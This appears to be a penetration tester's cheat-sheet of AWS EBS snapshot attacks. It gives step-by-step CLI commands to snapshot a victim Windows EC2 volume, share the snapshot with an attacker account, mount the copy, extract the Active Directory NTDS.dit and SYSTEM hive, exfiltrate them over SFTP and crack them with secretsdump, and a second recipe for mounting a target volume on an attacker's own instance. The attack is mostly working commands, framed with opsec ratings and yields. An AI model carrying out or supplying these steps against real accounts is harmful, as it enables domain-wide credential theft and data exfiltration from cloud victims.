# AWS EBS Shadow Copy Attack

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

### Shadow Copy Attack — Steal NTDS.dit from Windows EC2 via Cross-Account Snapshot [added: 2026-04]
- **Tags:** #AWS #EBS #ShadowCopy #NTDS #ActiveDirectory #CrossAccount #SnapshotExfil #CloudCopy #CredentialTheft
- **Trigger:** Target is a Windows EC2 running Active Directory and you have EC2 snapshot permissions
- **Prereq:** `ec2:CreateSnapshot` + `ec2:ModifySnapshotAttribute` on victim volume + attacker-controlled AWS account with EC2
- **Yields:** NTDS.dit + SYSTEM hive containing all AD domain credentials (hashes)
- **Opsec:** Med
- **Context:** Attacker has `EC2:CreateSnapshot` on a victim Windows EC2 — no direct access needed. Used to extract AD credentials (ntds.dit + SYSTEM hive).
- **Payload/Method:**
  ```bash
  # --- VICTIM-SIDE (with CreateSnapshot permissions) ---
  # 1. Find the target Windows instance volume
  aws ec2 describe-instances  # note volume ID

  # 2. Create snapshot
  aws ec2 create-snapshot --volume-id <volume-id> --description "audit"

  # 3. Share snapshot with attacker AWS account
  aws ec2 modify-snapshot-attribute --snapshot-id <snap-id> \
    --attribute createVolumePermission \
    --operation-type add \
    --user-ids <attacker_account_id>

  # --- ATTACKER-SIDE ---
  # 4. Create volume from stolen snapshot in attacker's AZ
  aws ec2 create-volume --snapshot-id <snap-id> --availability-zone <attacker-az>

  # 5. Launch Linux EC2 and attach the volume
  aws ec2 attach-volume --volume-id <new-vol-id> --instance-id <attacker-ec2> --device /dev/xvdf

  # 6. Mount and extract NTDS
  ssh ec2-user@<attacker-ec2>
  sudo mkdir /windows
  sudo mount /dev/xvdf1 /windows/

  sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user/
  sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user/
  sudo chown ec2-user:ec2-user /home/ec2-user/*

  # 7. SFTP exfil
  sftp ec2-user@<attacker-ec2>
  get /home/ec2-user/ntds.dit
  get /home/ec2-user/SYSTEM

  # 8. Crack locally
  secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets
  ```
- **Tool:** CloudCopy — https://github.com/Static-Flow/CloudCopy

### EBS Snapshot Attach to Existing Linux EC2 (Data Exfil) [added: 2026-04]
- **Tags:** #AWS #EBS #Snapshot #DataExfil #VolumeMount #EC2 #CloudDataTheft #LateralMovement
- **Trigger:** Have IAM permissions on EC2 volumes but no direct SSH/RDP access to the target instance
- **Prereq:** `ec2:CreateSnapshot` + `ec2:CreateVolume` + `ec2:AttachVolume` + an EC2 instance you control in the same AZ
- **Yields:** Full filesystem access to the target volume's data (configs, credentials, application data)
- **Opsec:** Med
- **Context:** Have IAM perms on EC2 but not direct instance access — create snapshot and mount elsewhere
- **Payload/Method:**
  ```bash
  # Create snapshot of target volume
  aws ec2 create-snapshot --volume-id <volumeID> --description "pentest" --profile <profile>

  # Create volume from snapshot (must be same AZ as your EC2)
  aws ec2 create-volume --snapshot-id <snap-id> --availability-zone <your-az>

  # Attach to your EC2
  aws ec2 attach-volume --volume-id <vol-id> --instance-id <your-ec2> --device /dev/sdfd

  # Mount and read
  sudo mount /dev/sdfd /mnt/stolen
  ls /mnt/stolen
  ```
